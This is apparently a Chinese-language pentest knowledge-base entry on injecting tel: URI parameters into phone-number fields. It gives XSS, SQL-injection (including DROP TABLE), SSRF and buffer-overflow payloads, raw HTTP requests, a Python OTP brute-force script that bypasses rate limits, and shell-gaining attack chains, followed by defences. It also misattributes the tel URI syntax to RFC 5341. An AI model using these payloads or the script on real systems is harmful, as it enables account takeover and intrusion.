---
attack_surface: [注入类, 认证/授权绕过, 编码/序列化滥用]
impact: [身份伪造, 权限提升, 信息泄露, 远程代码执行]
risk_level: 高
prerequisites:
  - tel: URI (RFC 5341) 语法理解
  - HTTP 协议基础
  - OTP/短信验证机制认知
  - 常见注入类漏洞原理 (XSS/SQLi/SSRF)
difficulty: 中级
related_techniques:
  - xss-cross-site-scripting
  - ssrf-server-side-request-forgery
  - sql-injection
  - 2fa-otp-bypass
  - buffer-overflow
tools:
  - Burp Suite
  - tel URI Parser
---

# Phone Number Injections — 电话号码注入

> 关联文档：[XSS](../../Reflected%20Values/XSS/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md) · [SQL Injection](../../Search/SQL%20Injection/README.md) · [2FA/OTP Bypass](../../../External%20Identity%20Management/2FA-OTP%20Bypass/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 Phone Number Injection

电话号码注入是一种利用应用对**电话号码输入缺乏严格规范化（Normalization）** 的攻击技术。攻击者通过向电话号码字段追加 RFC 5341 定义的 `tel:` URI 参数（如 `phone-context`、`isub`、`ext`），在后端或客户端触发 XSS、SSRF、SQL 注入、缓冲区溢出等多类漏洞，或利用格式变体绕过速率限制和认证机制。

**根因**：电话号码在系统中被当作**纯数字字符串**处理，但实际上 `tel:` URI 是一个结构化的复合格式，可以包含分号分隔的参数、域名上下文和特殊字符。当应用未对号码进行严格规范化和边界检查时，注入的参数可以穿透到不同的处理层。

## 1.2 tel: URI (RFC 5341) 结构

根据 RFC 5341，完整的 `tel:` URI 由以下部分组成：

```
tel:+32(0)476133337;ext=+32;isub=12456;phone-context=example.com
    │              │        │            │
    │              │        │            └── 本地号码上下文（域名）
    │              │        └── ISDN 子地址
    │              └── 分机号
    └── 全球号码（含国家代码）
```

| 组成部分 | 参数名 | 说明 | 注入潜力 |
|---------|--------|------|---------|
| **全球号码** | `+<cc><number>` | 带国家代码的全球唯一号码 | 格式变体绕过速率限制 |
| **本地号码** | `<local>` | 不包含国家代码的本地格式 | 需配合 `phone-context` |
| **分机号** | `;ext=` | 电话分机 | 参数重复、混淆 |
| **ISDN 子地址** | `;isub=` | ISDN 子地址路由 | **缓冲区溢出**（超长输入） |
| **上下文** | `;phone-context=` | 本地号码的域名上下文 | **XSS、SSRF**（注入 HTML/域名） |
| **服务码** | `*123#` | USSD 服务码 | 业务逻辑滥用 |

## 1.3 攻击面

任何接受用户电话号码输入并执行以下操作的端点都可能存在注入风险：

- **短信/OTP 发送** — 号码直接传入 SMS 网关 API
- **VOIP 呼叫路由** — 号码传入 SIP/H.323 网关
- **Web 页面渲染** — 号码作为 `tel:` 链接显示在页面中
- **数据库存储/查询** — 号码用于 SQL WHERE 条件
- **日志记录** — 号码写入日志文件或 SIEM
- **速率限制检查** — 号码用于 Redis/Memcached key

---

# 0x02 攻击分类

- **攻击面**：注入类、认证/授权绕过、编码/序列化滥用
- **影响维度**：身份伪造（OTP 绕过）、权限提升（账户接管）、信息泄露（SSRF）、远程代码执行（Buffer Overflow）
- **风险等级**：**高** — 电话输入几乎每个 Web 应用都有，且常被忽视

| 攻击类型 | 注入参数 | 影响 | 利用难度 |
|---------|---------|------|---------|
| **XSS via phone-context** | `;phone-context=` | 客户端代码执行 | 中 |
| **SSRF via phone-context** | `;phone-context=` | 内网探测/请求伪造 | 中-高 |
| **OTP 喷洒绕过** | 号码格式变体 | 认证绕过 | 中 |
| **SQL 注入** | 号码后缀 | 数据泄露/篡改 | 高（需注入点） |
| **VOIP 缓冲区溢出** | `;isub=` | 远程代码执行 | 高 |
| **VOIP 路由欺骗** | `;ext=` | 呼叫劫持 | 高 |

---

# 0x03 tel: URI 注入点详解

## 3.1 XSS via phone-context

当应用将用户输入的电话号码渲染为 `tel:` 链接的 `href` 属性或直接展示在页面上，且未对 HTML 特殊字符进行转义时：

**Payload**：

```
+3276771337;phone-context=<script>alert(0)</script>
```

**触发场景**：
- 个人资料页渲染 `tel:` 链接：`<a href="tel:+3276771337;phone-context=<script>alert(0)</script>">`
- 后台管理面板展示用户注册手机号
- OTP 发送日志回显用户号码

**根因**：HTML 上下文中的 `tel:` URI 被当作纯文本拼接，特殊字符 `<`、`>`、`"` 未转义。

## 3.2 SSRF via phone-context

当后端解析 `phone-context` 参数并发起对指定域名的 HTTP 请求时（如验证号码归属、查询运营商信息、VOIP 路由解析）：

**Payload**：

```
+3276771337;phone-context=inti.io
```

**攻击流程**：
1. 攻击者在注册/修改手机号时提交带 `phone-context=` 载荷的号码
2. 后端 SMS/VOIP 服务尝试解析 `phone-context` 域名以完成路由或验证
3. 服务端向 `inti.io`（攻击者控制的域名）发起 HTTP/DNS 请求
4. 可进一步利用：指向内网地址探测服务（`phone-context=10.0.0.1:8080`）

## 3.3 SQL Injection

电话号码字段在存储和查询时若直接拼接到 SQL 语句中：

**Payload**：

```
+3276771337' OR '1'='1
+3276771337'; DROP TABLE users; --
```

**触发场景**：
- `SELECT * FROM users WHERE phone = '{input}'`
- OTP 验证查询：`SELECT otp FROM otp_codes WHERE phone = '{input}'`

## 3.4 VOIP 缓冲区溢出

针对 C/C++ 编写的 VOIP/SIP 网关，当 `isub`（ISDN 子地址）参数无长度限制时：

**Payload**：

```
+32476772439;isub=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

发送超长 `isub` 值（数千个 'A'）→ 网关处理时 `strcpy`/`sprintf` 溢出 → 覆盖返回地址 → RCE。

## 3.5 VOIP 路由欺骗

利用参数重复和冲突解析混淆 VOIP 路由逻辑：

**Payload**：

```
0476772439;ext=+31;ext=+32
```

多个冲突的 `ext` 参数 → 路由解析器可能选择错误的扩展 → 呼叫被重定向到攻击者控制的线路。

---

# 0x04 OTP Spraying — 利用格式变体绕过速率限制

## 4.1 攻击原理

许多系统的 OTP 速率限制基于**电话号码的精确字符串匹配**。攻击者利用 `tel:` URI 格式变体，将同一真实号码伪装成多个"不同"的输入，每个变体获得独立的速率限制配额，从而将总尝试次数翻倍。

**关键前提**：
- 系统对输入号码未做规范化处理（如未剥离 `;ext=`、`;phone-context=` 等参数）
- 后端最终将不同格式映射到同一内部用户 ID
- 全局速率限制缺失

## 4.2 格式变体通道

以目标号码 `+3276771337` 为例，通过添加不同参数生成 N 个并行攻击通道：

| 通道 | 输入格式 | 系统视作 |
|------|---------|---------|
| 1 | `+3276771337` | 标准号 |
| 2 | `+3276771337;ext=0` | "不同"号 |
| 3 | `+3276771337;ext=1` | "不同"号 |
| 4 | `3276771337;ext=1000000` | "不同"号 |
| ... | `+3276771337;isub=0` | "不同"号 |
| N | `+3276771337;phone-context=attacker.com` | "不同"号 |

## 4.3 并行暴力破解策略

将 100 万个 OTP 空间（000000-999999）分割到多个通道，每个通道仅尝试少量 OTP 后轮转到下一个通道：

```
通道 1: OTP 000001 → 000002 → 000003 → BLOCK (3 次触发限制)
通道 2: OTP 000004 → 000005 → 000006 → BLOCK
通道 3: OTP 000007 → 000008 → 000009 → BLOCK
通道 4: OTP 999997 → 999998 → 999999 → ALL TESTED
```

**数学分析**：
- 单通道：3 次尝试即被锁定
- 10 个并行通道：3 × 10 = 30 次尝试
- 1000 个并行通道：3 × 1000 = 3000 次尝试
- 理论上可行：生成足够的 `ext=N` 变体来覆盖整个 OTP 空间

## 4.4 HTTP 请求示例

```http
# 通道 1 — 标准格式
POST /api/verify-otp HTTP/1.1
Host: target-site.com
Content-Type: application/json

{"phone": "+3276771337", "otp": "000001"}

# 通道 2 — 添加 ext 参数
POST /api/verify-otp HTTP/1.1
Host: target-site.com
Content-Type: application/json

{"phone": "+3276771337;ext=0", "otp": "000004"}

# 通道 N — 去加号 + 大 ext 值
POST /api/verify-otp HTTP/1.1
Host: target-site.com
Content-Type: application/json

{"phone": "3276771337;ext=1000000", "otp": "999997"}
```

## 4.5 Python 并发 OTP Spraying 脚本

```python
import requests
import concurrent.futures

TARGET = "https://target-site.com/api/verify-otp"
BASE_PHONE = "+3276771337"
NUM_CHANNELS = 100          # 并行通道数
ATTEMPTS_PER_CHANNEL = 3    # 每通道尝试次数（不触发锁定）

def try_otp(channel_id, otp_list):
    """每个通道使用不同的号码变体尝试指定 OTP 列表"""
    phone = f"{BASE_PHONE};ext={channel_id}"
    for otp in otp_list:
        r = requests.post(TARGET, json={"phone": phone, "otp": f"{otp:06d}"})
        if "success" in r.text.lower() or r.status_code == 200:
            print(f"[+] FOUND OTP: {otp:06d} (channel {channel_id})")
            return otp
    return None

# 将 OTP 空间 (0-999999) 分割到各通道
otp_space = list(range(1000000))
chunk_size = ATTEMPTS_PER_CHANNEL
chunks = [otp_space[i:i+chunk_size] for i in range(0, len(otp_space), chunk_size)]

with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_CHANNELS) as executor:
    futures = {executor.submit(try_otp, i % NUM_CHANNELS, chunk): i 
               for i, chunk in enumerate(chunks[:NUM_CHANNELS * 10])}
    for f in concurrent.futures.as_completed(futures):
        result = f.result()
        if result:
            print(f"[!!!] OTP CRACKED: {result:06d}")
            break
```

---

# 0x05 攻击链与联动

## 5.1 Phone Injection → XSS → Session Hijacking

```
[注册/修改手机号 → 注入 phone-context=<script>]
    → [管理员面板查看用户信息 → XSS 执行]
    → [窃取管理员 Cookie / Session Token]
    → [以管理员身份接管系统]
```

## 5.2 Phone Injection → SSRF → 内网穿透

```
[注册手机号 → phone-context=10.0.0.1:6379]
    → [后端 VOIP/SMS 服务解析域名 → 向 10.0.0.1:6379 发起请求]
    → [命中内网 Redis → 写入恶意 cron job]
    → [获得服务器 shell]
```

## 5.3 Phone Injection → OTP Spraying → 账户接管

```
[利用格式变体绕过速率限制]
    → [大规模并行 OTP 尝试]
    → [在 OTP 过期前命中正确值]
    → [账户接管 → 修改密码/绑定新设备]
```

## 5.4 Phone Injection → Buffer Overflow → RCE

```
[注册手机号 → isub=AAAA... (超长输入)]
    → [VOIP 网关解析 i-sub → 缓冲区溢出]
    → [覆盖返回地址 → shellcode 执行]
    → [获取网关系统权限]
```

---

# 0x06 防御策略

## 6.1 输入规范化（最关键）

```python
import re

def normalize_phone(phone_input):
    """只提取数字和 + 前缀，丢弃所有参数和特殊字符"""
    # 1. 去除所有空白
    phone = re.sub(r'\s+', '', phone_input)
    # 2. 去除 tel: 前缀
    phone = re.sub(r'^tel:', '', phone, flags=re.IGNORECASE)
    # 3. 丢弃分号及之后的所有内容（消除注入参数）
    phone = phone.split(';')[0]
    # 4. 仅保留数字和开头的 +
    if phone.startswith('+'):
        phone = '+' + re.sub(r'\D', '', phone[1:])
    else:
        phone = re.sub(r'\D', '', phone)
    # 5. 长度校验
    if len(phone.replace('+', '')) > 15:
        raise ValueError("Invalid phone number length")
    return phone
```

## 6.2 分层防御

| 防御层 | 措施 | 防护范围 |
|--------|------|---------|
| **输入层** | 规范化号码（剥离 `;` 后参数） | 阻止所有参数注入 |
| **输出层** | HTML 实体转义（渲染电话号码前） | XSS 防护 |
| **网络层** | 禁止后端向用户可控域名发起 HTTP 请求 | SSRF 防护 |
| **应用层** | 使用参数化查询（ORM/PreparedStatement） | SQL 注入防护 |
| **速率限制层** | 基于规范化后号码 + 设备指纹的全局速率限制 | OTP Spraying 防护 |
| **网关层** | VOIP 网关对 `isub`/`ext` 参数实施长度限制 | 缓冲区溢出防护 |

## 6.3 开发实践

1. **永远先规范化再使用** — 电话号在存储、查询、速率限制 Key 生成前必须经过规范化
2. **速率限制基于规范化号码** — 使用 `hashlib.sha256(normalized_phone).hexdigest()` 作为 Redis Key
3. **渲染时转义** — 即使号码已规范化，在 HTML 中渲染时仍需对 `<`、`>`、`"` 进行实体转义
4. **禁用不必要的 URI 解析** — 如果不需要解析 `phone-context`，不要将号码传给 tel: URI 解析器
5. **实施全局速率限制** — 不仅基于电话号码，还基于 IP、设备指纹、会话的多维度限制

---

# 0x07 参考资料

- [RFC 5341 — The tel URI for Telephone Numbers](https://datatracker.ietf.org/doc/html/rfc5341)
- [Intigriti — Phone Number Injections (YouTube)](https://www.youtube.com/watch?v=4ZsTKvfP1g0)
- [OWASP — Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [HackTricks — 2FA/OTP Bypass](https://book.hacktricks.xyz/pentesting-web/2fa-bypass)
